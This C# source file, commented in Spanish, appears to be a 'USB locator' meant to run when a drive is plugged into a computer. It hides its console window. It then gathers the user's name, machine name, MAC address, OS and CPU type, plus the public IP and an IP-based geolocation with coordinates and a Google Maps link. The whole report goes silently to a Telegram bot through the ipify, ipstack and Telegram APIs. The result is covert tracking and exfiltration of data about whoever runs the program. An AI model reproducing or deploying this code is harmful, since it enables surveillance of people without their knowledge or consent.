using System;
using System.Management;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using Telegram.Bot;

class UsbLocator
{
    
    // Importa la función SetConsoleWindowInfo desde la biblioteca kernel32 para poder ocultar la ventana.
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0; // Oculta la ventana
    private const int SW_SHOW = 5; // Muestra la ventana

    /***
     * Método principal del programa.
     */
    public static async Task Main(String[] args)
    {
        // Obtiene el identificador de la ventana de consola actual y la oculta para que el usuario no la vea.
        IntPtr consoleWindow = GetConsoleWindow();
        ShowWindow(consoleWindow, SW_HIDE);
        
        //Definición de variables.
        var telegramAdminChatId = "ESCRIBE AQUÍ EL ID DEL CHAT DE TELEGRAM";
        var mensaje = "🚨 DISPOSITIVO USB DETECTADO 🚨\n";

        //Construye el mensaje a enviar.
        mensaje += ObtenerDatosSistema();
        mensaje += ObtenerDatosUbicacion(ObtenerDireccionIpPublica());

        //Envia el mensaje por telegram con los datos.
        await EnviarMensajeTelegram(telegramAdminChatId, mensaje);
    }

    /***
     * Método que devuelve un string con los datos del sistema.
     */
    private static string ObtenerDatosSistema()
    {
        var datosSistema = "\n🖥 DATOS DEL SISTEMA\n";
        
        datosSistema += $"-Usuario: {Environment.UserName}\n";
        datosSistema += $"-Tipo de SO: {GetTipoDispositivo()}\n";
        datosSistema += $"-Dirección MAC: {GetDireccionMac()}\n";
        datosSistema += $"-Nombre del equipo: {Environment.MachineName}\n";
        datosSistema += $"-Arquitectura del procesador: {GetArquitecturaProcesador()}\n";

        return datosSistema;
    }

    /***
     * Método que devuelve un string con los datos de la ubicación.
     */
    private static string ObtenerDatosUbicacion(string ipAddress)
    {
        try
        {
            //Define los datos necesarios para hacer la petición a la API de IpStack.
            var apiKey = "ESCRIBE AQUÍ EL TOKEN DE LA API DE IPSTACK"; // Reemplaza con tu propia API key de ipstack
            var url = $"http://api.ipstack.com/{ipAddress}?access_key={apiKey}";
            
            //Hace la petición a IPStack y lee el JSON de respuesta para obtener los datos necesarios.
            var request = WebRequest.Create(url);
            var response = request.GetResponse();
            using (var streamReader = new StreamReader(response.GetResponseStream()))
            {
                var jsonResponse = streamReader.ReadToEnd();
                var data = JObject.Parse(jsonResponse);

                var datosUbicacion = "\n📍 DATOS DE UBICACIÓN\n";
                datosUbicacion += $"-Dirección IP: {data["ip"]}\n";
                datosUbicacion += $"-País: {data["country_name"]} {data["country_flag_emoji"]}\n";
                datosUbicacion += $"-Región: {data["region_name"]}\n";
                datosUbicacion += $"-Ciudad: {data["city"]}\n";
                datosUbicacion += $"-Código postal: {data["zip"]}\n";
                datosUbicacion += $"-Latitud: {data["latitude"]}\n";
                datosUbicacion += $"-Longitud: {data["longitude"]}\n";
                
                // Generar URL de Google Maps
                var latitud = data["latitude"].ToString().Replace(",", ".");
                var longitud = data["longitude"].ToString().Replace(",", ".");
                var mapsUrl = $"https://www.google.com/maps?q={latitud},{longitud}";

                datosUbicacion += $"-URL de Google Maps: {mapsUrl}\n";

                return datosUbicacion;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error al obtener los datos de ubicación: " + ex.Message);
            return string.Empty;
        }
    }

    /***
     * Método que obtiene la dirección IP pública del dispositivo.
     */
    private static string ObtenerDireccionIpPublica()
    {
        try
        {
            var url = "https://api.ipify.org";
            var request = WebRequest.Create(url);
            var response = request.GetResponse();
            using (var streamReader = new StreamReader(response.GetResponseStream()))
            {
                return streamReader.ReadToEnd();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error al obtener la dirección IP pública: " + ex.Message);
            return string.Empty;
        }
    }

    /***
     * Método que obtiene la arquitectura del procesador del equipo.
     */
    private static string GetArquitecturaProcesador()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var envVar = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            if (!string.IsNullOrEmpty(envVar))
            {
                return envVar;
            }
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            var command = "uname";
            var arguments = "-p";
            return ExecuteCommand(command, arguments);
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            var command = "sysctl";
            var arguments = "-n machdep.cpu.brand_string";
            return ExecuteCommand(command, arguments);
        }

        return "Desconocido";
    }


    /***
     * Método que envía un mensaje a través de Telegram.
     */
    public static async Task EnviarMensajeTelegram(string chatId, string mensaje)
    {
        try
        {
            var botToken = "ESCRIBE AQUÍ EL TOKEN DEL BOT DE LA API DE TELEGRAM";
            var botClient = new TelegramBotClient(botToken);

            await botClient.SendTextMessageAsync(chatId, mensaje);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error al enviar el mensaje a Telegram: " + ex.Message);
        }
    }

    /**
     * Método que obtiene el tipo de dispositivo (Windows, Linux o macOS).
     */
    public static string GetTipoDispositivo()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            return "Windows";
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            return "Linux";
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            return "macOS";
        }

        return "Desconocido";
    }

    /***
     * Método que obtiene la dirección MAC del dispositivo.
     */
    private static string GetDireccionMac()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up && !nic.Description.ToLower().Contains("virtual"))
                {
                    return nic.GetPhysicalAddress().ToString();
                }
            }
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            try
            {
                string command = "/sbin/ifconfig";
                string arguments = "-a";

                string output = ExecuteCommand(command, arguments);

                int startIndex = output.IndexOf("ether ") + 6;
                int endIndex = output.IndexOf(" ", startIndex);

                if (startIndex >= 6 && endIndex > startIndex)
                {
                    return output.Substring(startIndex, endIndex - startIndex);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error al obtener la dirección MAC: " + ex.Message);
            }
        }

        return "Desconocido";
    }

    /***
     * Método que ejecuta un comando en el sistema.
     */
    private static string ExecuteCommand(string command, string arguments)
    {
        using (var process = new System.Diagnostics.Process())
        {
            process.StartInfo.FileName = command;
            process.StartInfo.Arguments = arguments;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            var output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output.Trim();
        }
    }
}
